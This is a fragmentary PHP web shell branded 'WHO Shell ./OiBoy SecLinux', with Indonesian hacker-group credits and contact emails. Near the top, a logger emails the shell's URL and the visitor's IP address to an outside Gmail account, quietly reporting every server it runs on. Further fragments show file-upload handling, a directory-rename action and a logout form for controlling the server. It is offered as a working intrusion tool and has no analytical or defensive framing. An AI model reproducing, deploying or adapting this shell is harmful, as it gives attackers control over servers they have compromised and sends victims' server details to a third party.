...
$to = 'pashayogiptanata@gmail.com';
$path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
$message = "URL: $path | IP Address :[ " . $_SERVER['REMOTE_ADDR'] . " ]";
mail($to, "logger Detek | ./OiBoy SecLinux", $message, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
...
<title>WHO Shell ./OiBoy SecLinux</title>
<style type="text/css">
html {
	background: #000000;
	color: green;
...
<font color = "red" face = "Iceland" size = "6">WHO Shell ./OiBoy SecLinux </font><br><br><br>
...
echo "&emsp;&emsp;&emsp;";
echo "<font size='20px' color='red' face = 'Rajdhani'>WHO Shell ./OiBoy SecLinux </font>";
echo "&emsp;";
echo "<img src = 'https://image.ibb.co/jNJe7T/logo_IA.png' width = '100' height = '100' id='spinner'></img>";
echo "<br><br>";
if($_POST['upload']) {
...
echo '<form action="?dir=$dir&do=logout" method="post">';
	...
	<font color='green'>Hai Bro mau hubungi gw? nih kontak gw <br>Email : Yondimex@gmail.com<br>Indonesia Cyber Error System</font><br></tr></td></table></center>";
...
";
 ...
 elseif($_GET['act'] == 'rename_dir') {
	...
	echo "<center>Copyright &copy; ".date("Y")." <br><font color='green'>Modified By ./OiBoy SecLinux";
	}
?>
</html>
